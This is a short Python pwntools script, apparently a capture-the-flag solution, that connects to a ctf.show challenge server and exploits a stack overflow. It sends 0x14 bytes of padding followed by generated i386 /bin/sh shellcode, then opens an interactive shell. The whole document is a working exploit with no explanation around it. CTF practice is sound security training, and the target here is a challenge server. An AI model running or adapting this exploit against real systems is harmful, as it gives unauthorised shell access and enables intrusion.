from pwn import *
context(arch='i386', os='linux')

p = remote('pwn.challenge.ctf.show', 28251)

shellcode = asm(shellcraft.sh())

p.recvuntil(b"Some different!")
payload = b'A' * (0x10+4) + shellcode
p.sendline(payload)

p.interactive()

